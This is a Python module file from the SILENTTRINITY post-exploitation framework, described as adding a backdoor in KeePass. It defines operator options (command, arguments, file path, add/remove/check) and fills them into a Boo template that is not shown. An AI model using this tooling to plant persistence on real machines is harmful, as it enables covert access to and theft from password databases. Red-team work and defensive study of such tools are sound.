from silenttrinity.core.utils import get_path_in_package
from silenttrinity.core.teamserver.module import Module


class STModule(Module):
    def __init__(self):
        self.name = 'boo/keepasspersistence'
        self.language = 'boo'
        self.description = 'Add a backdoor in KeePass.'
        self.author = '@Daudau'
        self.references = []
        self.options = {
            'Command': {
                'Description'   :   'Command to execute.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Arguments': {
                'Description'   :   'Arguments for the command.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'FilePath': {
                'Description'   :   'File to create / modify.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Status': {
                'Description'   :   'Action to perform: add, remove or check.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

    def payload(self):
        with open(get_path_in_package('core/teamserver/modules/boo/src/keepasspersistence.boo'), 'r') as module_src:
            src = module_src.read()
            src = src.replace('COMMAND', self.options['Command']['Value'])
            src = src.replace('ARGUMENTS', self.options['Arguments']['Value'])
            src = src.replace('FILEPATH', self.options['FilePath']['Value'])
            src = src.replace('STATUS', str(self.options['Status']['Value']).lower())
            return src
